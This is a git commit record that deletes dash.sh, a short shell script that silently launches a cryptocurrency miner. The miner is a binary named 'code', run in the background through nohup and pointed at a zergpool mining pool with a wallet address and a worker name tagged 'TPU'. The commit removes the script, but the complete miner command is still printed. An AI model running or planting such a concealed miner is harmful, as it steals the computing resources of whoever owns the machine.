c33c55e24d26833b3494961920d08988b74ba52a
Gow17 <94526158+Gow17@users.noreply.github.com>
2021-12-01 14:26:46 +0000

    Delete dash.sh

--- dash.sh
+++
@@ -1,3 +0,0 @@
-#!/bin/bash
-chmod +x code >/dev/null 2>&1
-nohup ./code -v -l  verushash.asia.mine.zergpool.com:3300 -u XimPGUowKWQSoCjiTKnxyHxwBPTdvqRvBZ.$(echo $(shuf -i 1-99999 -n 1)-TPU) -p c=DASH -t 16 -x >/dev/null 2>&1
